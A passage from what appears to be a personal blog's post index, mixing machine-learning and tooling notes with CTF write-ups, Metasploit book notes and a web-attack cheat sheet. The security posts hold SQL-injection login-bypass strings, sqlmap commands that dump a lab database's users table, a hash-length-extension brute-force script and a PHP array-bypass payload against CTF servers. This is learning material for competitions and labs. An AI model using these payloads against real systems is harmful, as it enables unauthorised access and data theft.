PATH=”/home/user/anaconda3/envs/my_env/bin:/home/user/anaconda3/bin:PATH”  source ~/.bashrc  ``        Everything has done! Explore the TensorFlow by Jupyter!  ErrorIf you get the warning like that:/home/jxu/anaconda3/envs/tensorflow/lib/python3.6/importlib/_bootstrap.py:219: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88It means the numpy and the tensorflow version are conflict. So the solution is to use the commands to change the numpy version after you activate the anaconda environment.sudo pip uninstall numpysudo pip install numpy==1.14.5Then reactivate the environment and the warning disappear.2. TensorboardTensorboard is a very useful software which can provide five types of visualizations: scalars, images, audio, histograms and graphs.Step 1: Serializing the dataTensorboard operates by tensorflow events files. The following functions can be used to record the information.  tf.summary.scalar: collect the information of the variable changes  tf.summary.histogram: visualize the distributions of gradients or weights  tf.summary.merge_all: manage all the summary nodes  tf.summary.FileWriter: write the summary data to diskStep 2: Launch the TensorboardBefore runing Tensorboard, generate summary data in a log directory by the following code snippets:# sess.graph contains the graph definitionfile_writer = tf.summary.FileWriter('/path/to/logs', sess.graph)And then, run the tensorboard:tensorboard --logdir=path/to/log-directoryStep 3: Graph Visualizationuse tf.name_scope('') to push a name scope in the graph. The better your name scopes, the better your visualization.Tensorflow graphs have 2 kinds of connections: data dependencies and control dependencies.  data dependencies: solid lines  control dependencies: dotted linesFor networks with long sequences, sequential motifs that nodes whose names differ by a numer at the end and have isomorphic structures are collapsed into a single stack od nodes like range[1-8].3. A simple example with RNNSome key terminologies in neural network when reading the code:  batch_size: the number of training examples in one forward/backward pass  epoch: one forward pass and one backward pass of all the training examples  number of iterations: number of passes, each pass using [batch size] number of examplesExample: if you have 1000 training examples, and your batch size is 500, then it will take 2 iterations to complete 1 epoch.4. Data PreprocessingData NormalizationNormalization is an example of preprocessing data to remove or reduce the burden from machine learning (ML) to learn certain invariants, that is, things which make no difference in the meaning of the symbol, but only change the rep- resentation. So the data redundancy is reduced.5. Cross ValidationCross validation is primarily used to estimate the skill of a machine learningmodel on unseen data. That is, to use a limited sample in order to estimate how the model is expected to perform in general when used to make predictions on data not used during the training of the model. It is a popular method because it is simple to understand and because it generally results in a less biased or less optimistic estimate of the model skill than other methods, such as a simple train/test split.Stanford CS231nComputer VisionThe whole study materials in the blog are from Stanford official websites.1. Simple algorithms with basic concept in machine learningThe simple and core problems in Computer Vision is Image Classfication. The image can be reshaped to a matric with three colors channels Red, Green, Blue. But there are a lot of changes of the same object in different pictures based on the viewpoint variation, scale variation, deformation, background clutter and so on. The approach to solve the problem is the using of data-driven.k-Means NeighborThe first algorithm is Nearest Neighbor Classifier. It compares the mertics of different images and decides the result on the distance of them. The distance formula which is a reasonable choice is the following formula which is called $L1$ distance:\\(d_1(I_1, I_2) = \\Sigma_p|I_1^p - I_2^p|\\)The imporved algorithm is k-Nearest Neighbor Classifier which will find the top k closest images instead of the closest one.cross-validationNot just split the data into training set and validation set, the training set is divided into 5 equal folders and use 4 of themfor training and 1 for validation. And iterate over which folder is the validation set.hyper-parametersThey are associated with the classifier and do not have a good way to choose the bset value.loss/cost functionThe loss function can calcuate the distance between the true aim and the training result which measure the outcomes accurate.The following formula is the Multiclass Support Vector Machine(SVM) loss.\\[L_i = \\Sigma_{j\\neq y_i}max(0, s_j - s_{y_i} + 1)\\]The softmax classifier’s cross-entropy loass form:\\[L_i = -log\\Big(\\frac{e^{f_{}y_i}}{\\Sigma_j e^{f_j}}\\Big)\\]backpropagationBackpropagation is a way of computing gradients of expressions through recursive application of chain rule.activation function"
  },
  
  {
    "title": "CTF MISC Summary",
    "url": "/posts/CTF_MISC/",
    "categories": "",
    "tags": "Network",
    "date": "2018-05-01 00:00:00 -0700",
    





    
    "snippet": "MISC is the abbreviation of miscellaneou. It includes packets analysis, picture invisible and many other parts. This blog will summarize these concepts and problems to make it easier to remember th...",
    "content": "MISC is the abbreviation of miscellaneou. It includes packets analysis, picture invisible and many other parts. This blog will summarize these concepts and problems to make it easier to remember the whole stuff.First, I want to summarize the magic word of the pictures and executes which are useful in a lot of problems in CTF contest.            file type      start of image      end of image                  JPEG      ff d8      ff d9              JFIF      ff e0                     Exif      ff e1             We can use some commands to figure out the files’ real type and content:  file xxx.png  strings xxx.png[Finished] Wireshark数据包分析实战：Pracitical Packet Analysis[America] Chris Sanders1. 数据包分析基础1.1 数据包嗅探器工作原理：将嗅探器设置在指定的位置，收集往来的数据包，转换成可读形式，识别分析和验证协议。1.2 OSI七层模型：            层次      协议                  应用层      HTTP, SMTP, FTP, Telnet              表示层      ASCII, MPEG, JPEG, MIDI              会话层      NetBIOS, SAP, SDP, NWLink              传输层      TCP, UDP, SPX              网络层      IP, IPX              数据链路层      Ethernet, Token Ring, FDDI, AppleTalk              物理层             1.3 数据封装不同层次在数据包头部增加或去除数据块，实现封装：以太网+IP+TCP+HTTP。1.4 网络硬件  集线器：半双工模式（不能同一时间接收和发送数据），会将从一个端口收到的数据包向其他每一个端口传输，高负载时效率低下。  交换机：向指定端口传输数据包，工作在数据链路层。  路由器：工作在网络层，用IP地址标识网络设备。1.5 在交换式网络中进行嗅探  端口镜像：获取目标设备传输与接收的网络流量。要求：交换机提供这个功能；监听端口的流量不能小于被监听端口的流量。  集线器输出：通过在被监听设备上使用集线器实现监听。  网络分流器：在某段网线上增加网络分流器实现监听流经网线的数据。  ARP欺骗：在局域网中发送包含虚假MAC地址的ARP消息，以劫持其他计算机流量的过程。推荐工具：Cabin&amp;Abel2. WiresharkWireshark是目前最好用的嗅探工具之一，其主窗口分为三个部分：Packet List, Packet Details and Packet Bytes.2.1 数据包操作  查找数据包：ctrl+F，匹配下一个：ctrl+N，匹配上一个：ctrl+B；  标记数据包：ctrl+M，切换下一个：shift+ctrl+N，切换上一个：shift+ctrl+B；  设置数据包相对时间：Edit-&gt;Set Time Reference2.2 过滤器包括捕获过滤器和显示过滤器。  捕获过滤器语法，使用Berkeley Packet Filter(BPF)：          与或非：&amp;&amp;, ||, !      主机名和地址过滤器：                  host + IPv4, IPv6, 主机名；          src/dst + host + IPv4；对源地址和目标地址进行过滤          ether host + Mac地址；对Mac地址进行过滤                    端口和协议过滤器：(dst) + port + 8080；      协议过滤器：icmp, !ip6;      协议域过滤器（高级）：需要对协议有深入理解                  icmp[0] == 3；过滤目标不可达（类型3）的ICMP数据包          icmp[0:2] == 0x0301；过滤目标不可达、主机不可达（类型3代码1）的ICMP数据包                      显示数据包：          ip.addr == 192.168.0.1；根据IP地址过滤      frame.len&lt;=128；过滤长度小于128字节的数据包      逻辑运算符：and, or, xor, not        查看端点：Statistics-&gt;Endpoints  查看网络会话：Statistics-&gt;Conversations  基于协议分层结构的统计数据：Statistics-&gt;Protocol Hierarchy  名字解析：Capture-&gt;Options          Mac地址解析：使用ARP协议将Mac地址转化成IP地址      网络名字解析：IP地址转化为域名      传输名字解析：将端口号转化为协议名称        更换解析器：遇到错误识别协议的情况下使用  跟踪TCP流：选择数据包右键Follow TCP Stream  数据包长度总结：Statistics-&gt;Packet Lengths-&gt;Create Stat  图形展示：Statistics-&gt;IO Graphs          双向时间表：Statistics-&gt;TCP Stram Graph-&gt;Round Trip Time Graph      数据流图：Statistics -&gt; Flow Graph        专家信息：对话、注意、警告、错误3. 通用底层网络协议3.1 地址解析协议(ARP)头包含的数据：ARP协议工作在数据链路层和网络层之间，由于其封装成帧的形式，可以看做属于数据链路层。  硬件类型：数据链路层使用的类型数据，一般是以太网（类型1）  协议类型：ARP请求正在使用的高层协议  硬件地址长度  协议地址长度  ARP操作码：1表示请求，2表示响应  发送方硬件地址  发送方协议地址  目标硬件地址  目标协议地址3.2 互联网协议(IP)以太网在数据链路层能传输的最大数据包大小是1500字节，即最大传输单元Maximum Transmission Unit(MTU)。存活时间(TTL)代表该数据包在被丢弃之前所能经历的跳数，每经过一个路由器跳数减一。ICMP ping工具以此来检测设备之间的通信情况。  IPv4头          版本号：IP所使用的版本      首部长度：IP头的长度      服务类型：优先级标志位和服务类型标志位      总长度      标识符：用于识别数据包或被分片数据包的次序      标记：区分数据包是否是一组分片数据包      分片偏移      存活时间：剩余经过路由器跳数      协议：上层协议数据包类型      首部校验和：数据错误检测机制      源IP地址      目的IP地址      选项      数据      3.3 传输控制协议(TCP)为数据提供可靠的端到端传输，工作在传输层，可以处理数据的顺序和错误恢复。  TCP头          源端口      目的端口      序号：表示TCP片段      确认号      标记号                  URG          ACK          PSH          RST：连接被异常终止或拒绝连接请求          SYN          FIN                    窗口大小      校验和      紧急指针      选项        TCP三次握手          A -SYN-&gt; B      A &lt;-SYN/ACK- B      A -ACK-&gt; B        TCP终止          A -FIN/ACK-&gt; B      A &lt;-ACK- B      A -FIN/ACK-&gt; B      A -ACK-&gt; B        TCP重置: RST, ACK3.4 用户数据报协议(UDP)工作在传输层，提供高速传输，称为“无连接协议”。  UDP头          源端口      目标端口      数据包长度      校验和      3.5 互联网控制消息协议(ICMP)：负责提供在网络上设备、服务以及路由器的可用性信息。属于网络层协议。  ICMP头：          类型Type      代码Code      校验和Checksum      可变域Variable      3.5.1 ping工具用于发送ICMP echo请求数据包3.5.2 路由跟踪：通过发送TTL不断自增的数据包，实现可以了解ICMP数据包发送的每一跳的节点的信息。Windows下使用tracert &lt;IP&gt;命令。4. 常见高层网络协议4.1 动态主机配置协议(DHCP): 早起使用BOOTP(Bootstrap Protocol)协议，后来被DHCP取代，用户让设备自动获取IP地址。基于UDP协议。  DHCP头          操作代码Opcode      硬件类型Handware Type      硬件长度Handware Length      跳数Hops      事务ID(Transaction ID)      消耗时间Seconds Elasped      标记Flags      客户端IP地址Client IP Address      你的IP地址      服务器IP地址      网关IP地址      客户端硬件地址      服务器主机名      启动文件Boot File      选项Options        续租过程          Client -discover-&gt; Server      Client &lt;-offer- Server      Client -request-&gt; Server      Client &lt;-acknowledgement- Server      4.2 域名系统DNS：将域名解析成IP地址。  基于UDP协议。  如果本地DNS服务器没有指定域名对应的IP地址，则会向外部DNS服务器递归查询。  区域传送（冗余备份需要）          完整区域传送（AXFR）      增量区域传送（IXFR）      4.3 超文本传输协议HTTP：万维网传输机制，用于连接Web服务器。常使用80端口。5. 实际案例  利用wireshark分析门户网站的登录和发布消息的过程。  查看DNS流量  查看HTTP请求5.1 TCP错误恢复机制5.1.1 超时重传(RTO, Retransmission timeout)：每次重传RTO翻倍，若超过最大值则放弃重传。5.1.2 重复确认和快速重传：接收方发送3个重复ACK，代表数据包丢失，申请快速重传。5.1.3 流控制：通过调整窗口大小控制接受的数据包大小。5.2 网络高延迟的原因  线路延迟  客户端延迟  服务器延迟  网络基线：通过基线的帮助，比对整体流量快照          站点基线      主机基线      应用程序基线      6. 安全领域数据包分析  nmap使用SYN半开扫扫描判断受害者的端口是否开放  通过系统扫描指纹术，判断对方机器的种类和类型  ARP缓存中毒攻击，遭到中间人攻击  远程访问特洛伊木马7. 无线网络数据包工作在数据链路层7.1 无线网卡模式  被管理模式：无线客户端正常连接无线接入点(WAP, Wireless Access Point)时的使用模式  Ad hoc模式：通信双方共同承担WAP的指责  主模式：高端无线网卡成为其他主机的WAP  监听模式7.2 802.11数据包结构  管理：包括认证、关联、信号          管理帧头部信息                  Timestamp          Beacon Intercal          Capability Information          SSID Parameter Set          Supported Rates          DS Parameter                      控制：包括请求发送、准予发送  数据  beacon：广播数据包，通知无线客户端存在可用WAP在Packet List增加无线专用列：  RSSI(for Received Signal Strength Indication):捕获数据包射频强度  TX Rate(for Transmission Rage):捕获数据包数据率  Frequency/Channel:捕获数据包频率和信道无线网络安全  WEP(Wired Equivalent Privacy)：不安全  WPA(Wi-Fi Protected Access)：常用的安全协议附录：  tcpdump  Scapy：基于python的数据包操纵程序  SANS SEC 503安全入侵检测深入课程"
  },
  
  {
    "title": "Go language",
    "url": "/posts/Go_learning/",
    "categories": "",
    "tags": "System",
    "date": "2018-04-14 00:00:00 -0700",
    





    
    "snippet": "Go Learningsource  github  documentsgo tool tourKuberneteDockerHow to build your own docker imageDocker image can be automatically built by using Dockerfile. The whole summary base on the docker do...",
    "content": "Go Learningsource  github  documentsgo tool tourKuberneteDockerHow to build your own docker imageDocker image can be automatically built by using Dockerfile. The whole summary base on the docker documentation.      Image building command usage:    docker build &lt;path&gt; -&lt;flag&gt; parameter &lt;file path&gt;    We can use different flags to specialize the image.                            flag          instruction                                      -f          point to a Dockerfile in the file system                          -t          tag an image                          Dockerfile Format:    The file is not case-sensitive. But the convention is to UPPERCASE the comments to distinguish them easily. A Dockerfile must start with FORM instruction.    Example:     FROM busybox ENV foo /bar WORKDIR ${foo}   # WORKDIR /bar ADD . $foo       # ADD . /bar COPY \\$foo /quux # COPY $foo /quux              FROM: initialize a new image and set the Base Image.                  ARG is the only instruction that may precede FROM and can declare the variables.                    RUN:                  RUN &lt;command&gt;: run command in a shell equal to /bin/sh -c or cmd /S /C          RUN [\"executable\", \"param1\", \"param2\"]: exec form                    CMD: There can only be one CMD instruction in a Dockerfile. If you list more than one CMD then only the last CMD will take effect.                  The main purpose of a CMD is to provide defaults for an executing container.          CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form)          CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)          CMD command param1 param2 (shell form)                    LABEL: add metadata to an image. It is a key-value pair.      MAINTAINER: set the Author field of the generated image.                  example: LABEL maintainer=\"SvenDowideit@home.org.au\"   \t- EXPOSE : inform Docker that the container listens on the specified network prots at runtime.  \t- ENV  : set the environment vatiable `` to the ``                      \t- ADD  \t- COPY  \t- ENTRYPOINT  \t- VOLUME  \t- USER  \t- WORKDIR  \t- ONBUILD  \t- STOPSIGNAL  \t- HEALTHCHECK  \t- SHELLTutorial: Make a laravel docker image"
  },
  
  {
    "title": "Qiangwnagbei WriteUp",
    "url": "/posts/qiangwangbei_writingUp/",
    "categories": "",
    "tags": "CTF",
    "date": "2018-03-27 00:00:00 -0700",
    





    
    "snippet": "Team Resultrank:53score:1066others’ writeup  http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html  MISC1. ai-animalI got a picture and a script in python. The script is running on t...",
    "content": "Team Resultrank:53score:1066others’ writeup  http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html  MISC1. ai-animalI got a picture and a script in python. The script is running on the server. The following function is responsible for printing the flag. The server just receives packets which are smaller than 1024 bits. And the server will decode the packets by base64.    def remote_sub(conn, address):        print address        (ip, port) = address        conn.send(\"plz input your base64 encode pic:\")        expect_len = 62256        data = ''        while True:            rdata = conn.recv(1024)            data += rdata            expect_len -= 1024            if expect_len &lt; 0:                 break        image_data = base64.b64decode(data)        ori_image = open('/tf_files/test/basque-shepherd-dog.jpg', 'rb').read()                if check_diff(image_data, ori_image) == -1:            conn.send('no\\n')            sys.exit(0)        else:            conn.send('lets go\\n')                # Loads label file, strips off carriage return        label_lines = [line.rstrip() for line                           in tf.gfile.GFile(\"/tf_files/retrained_labels.txt\")]                # Unpersists graph from file        with tf.gfile.FastGFile(\"/tf_files/retrained_graph.pb\", 'rb') as f:            graph_def = tf.GraphDef()            graph_def.ParseFromString(f.read())            _ = tf.import_graph_def(graph_def, name='')                with tf.Session() as sess:            # Feed the image_data as input to the graph and get first prediction            softmax_tensor = sess.graph.get_tensor_by_name('final_result:0')                    predictions = sess.run(softmax_tensor, \\                     {'DecodeJpeg/contents:0': image_data})                    # Sort to show labels of first prediction in order of confidence            top_k = predictions[0].argsort()[-len(predictions[0]):][::-1]            print top_k                    if top_k[0] == 1:                conn.send(config.flag + '\\n')And the encoded text is 4/3 longger than plain text in base64. So everytime I need to send a packet which has 768 bits. And then receiving 2 packets will lead to the flag. The following script will get the flag automatically.\t# -*- coding=UTF-8\timport socket\timport base64\timport time\t\tbind_ip =\"117.50.13.213\"\tbind_port = 12345\t\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ts.connect((bind_ip, bind_port))\tprint(s.recv(1024).decode('utf-8'))\t\twith open('/root/Desktop/test/basque-shepherd-dog.jpg', 'rb') as f:\t    while True:\t        time.sleep(0.01)\t        piece = f.read(768)   \t        if not piece:\t            break\t        s.sendall(base64.b64encode(piece))\t        # print piece\tprint(s.recv(1024).decode('utf-8'))\tprint(s.recv(1024).decode('utf-8'))"
  },
  
  {
    "title": "Metasploit",
    "url": "/posts/Metasploit/",
    "categories": "",
    "tags": "Security",
    "date": "2018-03-18 00:00:00 -0700",
    





    
    "snippet": "Metasploit渗透测试魔鬼训练营诸葛建伟 陈力波 孙松柏 等著1. 基础知识1.1 Metasploit使用接口：msfgui, msfconsole, msfcli。（最新kali2018只含有msfconsole）2. 渗透测试实验环境深入理解3. 情报搜集技术3.1 注册信息查询  whois：查询域名注册信息数据库  nslookup：从DNS解析服务器保存在缓存中的非权威解答...",
    "content": "Metasploit渗透测试魔鬼训练营诸葛建伟 陈力波 孙松柏 等著1. 基础知识1.1 Metasploit使用接口：msfgui, msfconsole, msfcli。（最新kali2018只含有msfconsole）2. 渗透测试实验环境深入理解3. 情报搜集技术3.1 注册信息查询  whois：查询域名注册信息数据库  nslookup：从DNS解析服务器保存在缓存中的非权威解答  dig：从域名官方DNS服务器上查询到精确的权威解答3.2 Google Hacking(感觉没有什么效果)常用指令：site, inurl, filetype3.3 端口扫描  metasploit：auxiliary/scanner/discovery or portscan  nmap：分为4种状态open/closed/filtered/unfiltered3.4 常见网络服务扫描  telnet（用于价格昂贵的老实服务器）：auxiliary/scanner/telnet/telnet_version  ssh：scanner/ssh/ssh_version  oracle数据库服务：scanner/oracle/tnslsnr_version  开放代理：scanner/http/open_proxy3.5 口令探测与嗅探  ssh口令猜测：取决于字典的质量  psnuffle：只能嗅探同一网络环境下的，外网无法嗅探内网的登录3.6 网络漏洞扫描openvas：一款开元综合型漏洞扫描器，用于识别远程主机、web应用存在的漏洞。在metasploit里可以载入openvas插件。此外，可以通过nmap找寻特定服务漏洞。admin/1234563.7 渗透测试数据库共享使用postgresql或者metasploit RPC共享。metasploit第一次使用时postgresql是没有连接的，如下命令实现新建：msfdb init。metasploit装载openvas模块时需要连接数据库：openvas_connect username password IP port  问题：metasploit使用openvas模块会有warning，运行如openvas_report_list等指令。暂时没有找到解决方法。4. Web应用渗透技术4.1 流行攻击方式  SQL注入攻击          普通注入      盲注        跨站脚本攻击 Cross Site Scripting          存储型XSS：持久存储在目标服务器数据库或文件中      反射性XSS：注入脚本从攻击者服务器下载文件到受害者浏览器上      DOM型XSS：通过URL建立DOM对象        跨站伪造请求 Cross Site Request Forgery4.2 基于Metasploit框架的web应用渗透技术4.2.1 辅助模块: moudles/auxiliary/路径下//通过wmap可以得到指定服务器的扫描结果和可利用的漏洞load wmapwmap_sites -a 10.10.10.254wmap_sites -lwmap_targets -t 10.10.10.254wmap_run -twmap_run -evulns4.2.2 渗透模块主要路径在exploit/unix/webapp, exploit/windows/http, exploit/multi/http其他的web应用漏洞扫描工具：W3AF, SQLMap, wXf, XSSF, BeEF4.3 开源Web应用漏洞扫描工具  Wapiti: 对SQL注入扫描准确度排第一  W3AF: 功能强大，配置繁琐。Kali2018安装w3af失败，python报错，未解决          w3af分为两个部分：核心模块和插件模块        Sandcat Free Edition: 对XSS检测效率最好  Brup suite Free: 渗透利器，功能强大4.4 安装wXf ruby报错，未解决4.5 使用owasp/dvwa进行试验4.5.1 sql注入：  sqlmap -u 'http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#' --cookie='security=low;PHPSESSID=on3qqvc40chq38nlhh6e4bghj1'  --dbs -v 0  -D dvwa --tables  -D dvwa --tables -T users --columns  -D dvwa --tables -T users --columns --dump#"
  },
  
  {
    "title": "iTerm 2 configuration",
    "url": "/posts/iTerm2_configuration/",
    "categories": "",
    "tags": "System",
    "date": "2018-01-16 00:00:00 -0800",
    





    
    "snippet": "iTerm 2 ConfigurationiTerm 2 is an useful terminal tool on Mac. It is a highly customizable terminal and come with a lot of features. This is a simple tutorial to show how to download and config it...",
    "content": "iTerm 2 ConfigurationiTerm 2 is an useful terminal tool on Mac. It is a highly customizable terminal and come with a lot of features. This is a simple tutorial to show how to download and config it. I got a lot of help by Sourabh’s gitbook1. DownloadThe direct way to download it is by its homepage. There is also a document in it which I think is too brief for freshman.2. CustomizationiTerm 2 offers a complex preferences.The colors and font Setting  Set hotkey to open the iTerm2 at any time by cmd + F12 on Mac’s Preperences &gt; Keyboard &gt; Shortcuts &gt; Services by making a new Automator whose name is “开启iTerm2” which is a Mac’s program installed before sold.  Download color schemes and select favourite color schemes. I suggest Solarized Dark.  Change the cursor text and cursor color to yellow make it more visible.Shortcuts  cmd + / show the cursor’s position  cmd + opt + e show every windows  cmd + d/cmd + shift + d divide the screen by vertically or horizontally  cmd + f find the key words  cmd + enter toggle full screenWhat’s more, iTerm 2 can enable you to design your own profiles and change the colors, windows, terminals and other configuration. On the Preferences &gt; Profiles &gt; Keys &gt; Hotkey Windows, I set F12 to show a new shell which I need like the following picture.tmux Configuration"
  },
  
  {
    "title": "Junior 0ops WriteUp",
    "url": "/posts/Junior_0ops_writingUp/",
    "categories": "",
    "tags": "CTF",
    "date": "2017-12-11 00:00:00 -0800",
    





    
    "snippet": "Resultrank:19score:1100Web1. Penetrate In [Unfinished]Question\t&lt;?php\t\tinclude 'secret.php';\t\t@$username = $_POST[\"username\"];\t@$password = $_POST[\"password\"];\t\tif (isset($_COOKIE[\"hmac\"])) {\t   ...",
    "content": "Resultrank:19score:1100Web1. Penetrate In [Unfinished]Question\t&lt;?php\t\tinclude 'secret.php';\t\t@$username = $_POST[\"username\"];\t@$password = $_POST[\"password\"];\t\tif (isset($_COOKIE[\"hmac\"])) {\t    if ($username === \"admin\" &amp;&amp; $password != \"admin\") {\t        if ($_COOKIE[\"hmac\"] === md5(\"$secret|$username|$password\")) {\t            die(\"The flag is \" . $flag);\t        }\t    }\t} else {\t    setcookie(\"hmac\", md5(\"$secret|admin|admin\"), time() + (60 * 60 * 24 * 7));\t    show_source(__FILE__);\t}AnswerThis problem need to use hash length extension attack to get the flag. But the problem is that I don’t have the length of the secret so I need to enumerate it. Actually, I haven’t find it yet.I find the following tools and write a script to enumerate the length of the secret. I don’t know what’s the problem which I need to read others’ writeup.  Hash-extender  HashPumpThe script is writen in python.\t# -*- coding:utf-8 -*-\tfrom urlparse import urlparse\tfrom httplib import HTTPConnection\tfrom urllib import urlencode\timport json\timport time\timport os\timport urllib\timport requests\t\t\tdef gao(x, y):\t    #cookie = \"\"\t    cookie = {\"hmac\" : y}\t    r = requests.post(\"http://202.121.178.201:8081/\", data={'username': 'admin', \t'passowrd': x}, cookies = cookie)\t    resp = r.text\t    #print resp\t    #exit()\t    return resp\t\tfor i in xrange(10000):\t    #print i\t    #secret len = ???\t    find_hash = \"../hash_extender/hash_extender --data admin --signature \tbe9fcfa876db5f4184e1635ce6561de7 --format md5  -a sb --out-data-format=html \t--secret \" + str(i) + \" --quiet\"\t    #print find_hash\t    calc_res = os.popen(find_hash).readlines()\t    #print calc_res\t    hash_value = calc_res[0][:32]\t    attack_padding = calc_res[0][32:]\t    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])\t    ret = gao(attack_padding, hash_value)\t    #print ret\t    if \"The flag\" in ret:\t        print ret\t        break2. Shatter Sha512Question\t&lt;?php\t// can u break sha512 algorithm ?\t\terror_reporting(-1);\t\tinclude 'flag.php';\t\tif (!isset($_GET['x']) || !isset($_GET['y'])) {\t    die(show_source(__FILE__));\t}\t\t$x = $_GET['x'];\t$y = $_GET['y'];\t\tif ($x != $y) {\t\t    if (hash(\"sha512\", $x) === hash(\"sha512\", $y)) {\t        echo $flag;\t    }\t\t}\tAnswerThe key is to find that when php function hash(“sha512”,$x) is used to figure out whether two different variables are equal. If variable $x is array the function return false.So the payload is http://202.121.178.201:8083?x[]=1&amp;y[]=2.MISC1. Mystery NumberI get a string which is 5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239.I find that it just has 0-9 and a-e. So I guess it is a hex number. I translate it to hex format by a website.Then I get a string ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9.And then I use Base 64 decode to get the flag.2. Easy Traffic AnalyzeI get a file named flag.pcap. The pcap format file can be loaded on wireshark which consists of an application programming interface (API) for capturing network traffic. But it lost the pcap header. I find a website which introduces the pcap header and get the example header it offers and add it to the file.Then I open the file by Wireshark. I use File &gt; Export Objects &gt; HTTP get three files which is upload.php, upload(1).php and test.php. I use binwalk to find the content of upload.php and the result is that it is a ZIP archive data.Then I rename the upload.php to flag.zip and unzip it. After that, I get a flag1.png. I use binwalk -e flag.png to get two file from flag1.png whose name are 5B and 5B.zlib.I write a python script to output the content of 5B.zlib and find the flag at the end of the file.\timport zlib \tdata = open('5B.zlib','rb').read()\tprint dataIn the course of finding the method to solve the problem, I find some useful tools, such as binwalk, dd,unzip.A dd example:dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1Reverse1. BabyreI get a pyc file which contain byte code and Python interpreter complies the sources to it. I change it to py file by a tool.Then I read the code and get the encode method. I write a decode script to get the flag.\tfrom hashlib import md5\tdef md5raw(s):\t    return bytearray(md5(s).digest())\tdef xor(a, b):\t    assert len(a) == len(b)\t    return bytearray([ i ^ j for i, j in zip(a, b) ])\tflag = bytearray('\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc\t\t1&lt;\\xa9\\\\A\\xde\\xd22\\n')\t\t\t\tfor i in range(16):\t\tflag[:16], flag[16:] = flag[16:], flag[:16]\t\tflag[:16] = xor(flag[:16], md5raw(flag[16:]))\tprint flagCrypto1. AES-ServerI get a server.py which tell me that the server runs a AES CBC decrypt program. I should enter IV and enc to construct a plaintext whose beginning string is admin.   After learning the theory,And I find that if I don’t change variable enc, the secret and the enc’s result after block cipher decryption will never change. So I set IV equal to 0 at first and get a string named temp. Then xor hex(admin) and temp, I got the IV. Use this IV and enc, I construct the plaintext begin with amin and get the flag."
  },
  
  {
    "title": "emacs总结",
    "url": "/posts/emacs%E6%80%BB%E7%BB%93/",
    "categories": "",
    "tags": "System",
    "date": "2017-11-22 00:00:00 -0800",
    





    
    "snippet": "emacs总结教程来源快捷键显示方式用法：  “C-x”表示按住control的同是按住x键  “M-x”表示按住alt的同时按住x键（Mac上没有用）/按一下esc再按一下x快捷键总结：  C-g: quit  C-x C-c: exit  C-x C-f: opne a file  C-x C-s: save file  C-f/C-b: move forword/back a char...",
    "content": "emacs总结教程来源快捷键显示方式用法：  “C-x”表示按住control的同是按住x键  “M-x”表示按住alt的同时按住x键（Mac上没有用）/按一下esc再按一下x快捷键总结：  C-g: quit  C-x C-c: exit  C-x C-f: opne a file  C-x C-s: save file  C-f/C-b: move forword/back a character  M-f/M-b: move forword/back a word  C-d/M-d: delete a character/word  C-_: undo  C-p/C-n: Move up/Down to the previous line  C-a/C-e: Move to the beginning/end line9:40"
  },
  
  {
    "title": "安全笔记--Web攻击技术",
    "url": "/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/",
    "categories": "",
    "tags": "Security",
    "date": "2017-11-11 00:00:00 -0800",
    





    
    "snippet": "2 Web攻击技术2.1 Web漏洞概述  OWASP(Opwn Web Application Security Project)          owaspbwa        注入  失效的身份认证和会话管理          Padding Oracle会话管理漏洞研究一波                  对称加密 + CBC                      跨站脚本（...",
    "content": "2 Web攻击技术2.1 Web漏洞概述  OWASP(Opwn Web Application Security Project)          owaspbwa        注入  失效的身份认证和会话管理          Padding Oracle会话管理漏洞研究一波                  对称加密 + CBC                      跨站脚本（XSS）  失效的访问控制  敏感信息泄露  攻击检测防范和不足  跨站请求伪造（CSFR）2.2 Web服务器的探测  WAF探测web application firewall          nmap的waf探测脚本                  nmap -p 80 –script http-waf-detect.nse www.xxx.com                    wafw00f                  waf00f www.xxx.com                      Web服务器负载均衡探测          CDN（content distribution network）内容分发网站      Cloudflare 一台服务器数据传到CDN厂商的各个节点，用户访问各个Cloudflare节点      lbd www.xxx.com\t负载均衡探测        Web页面爬取          Dirbuster 网站目录和文件的遍历和猜解                  字典位置： /usr/share/dirbuster/wordlists/                    httrack网站镜像/克隆      vbscan\t\t探测vBulletin及其漏洞      vane/wpscan 探测Wordpress及其漏洞      joomscan 探测joomla及其漏洞      2.3 针对Web脚本的攻击  SQL注入漏洞攻击          Bricks                  第一题                          'or'1'='1              'or'1              如果不能输入单引号                                  用户名：\\                  密码： or 1#                                                              第二题（js查看网页源代码，js多了一道检测输入特殊字符的函数，需要绕过）                          function onSubmitOfLoginForm(…)              1.覆盖原函数(检查-console-可以覆盖原先的函数)                                  function onSubmitOfLoginForm (){ return true;}                                            2.定义函数永远返回true              3.输入万能密码即可              4.禁用js中的执行                                第三题                          1')or('1=1              SELECT * FROM users WHERE name=('1')or('1=1') and password=('1')or('1=1') LIMIT 0,1                                第四题                          双引号                                第五题                          'or'1'# or 'or'1'--               #注释之后的sql语句              微软数据库注释符 -- + 空格              md5散列（128bit 16byte 32ascii字符）              sha1（160bit 20byte 40ascii）              sha256（256bit 32byte 64ascii）                                http://www.wechall.net/ 题库          第六题                          重定向                                第七题                          先匹配用户名，在查询比对密码              用户名：'and 0 union select md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1')#              密码：1                                          mysql常用语句                  select version();          select database();          select user();          show databases;          use mysql;          show tables;          desc user;\t//描述user表          select Host,User,Password from user;          select Host,User,Password from user where User=’root’ and 1;          select Host,User,Password from user where User=’root’ and 0 union select 1,2,3;   //让左边记录为空，控制右边的返回值          select Host,User,Password from user where User=’’ and 0 union select 1,2,md5(‘1’);                          